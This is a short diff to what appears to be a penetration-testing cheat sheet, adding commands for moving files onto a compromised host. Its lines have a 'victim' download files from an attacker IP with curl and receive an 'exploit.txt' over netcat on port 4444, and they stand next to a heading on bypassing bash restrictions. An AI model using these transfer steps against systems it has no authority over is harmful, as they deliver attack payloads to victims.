@@ -88,7 +88,8 @@ Victim: curl -O http://192.168.0.101/file.txt<br>
 Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
 Victim:nc 192.168.1.102 4444 > exploit.txt<br>
 
-
+Attacker: python -m SimpleHTTPServer 9999<br>
+Victim: curl -O http://192.168.0.101/file.txt <br>
 
 
 **bypass-bash-restrictions**<br>
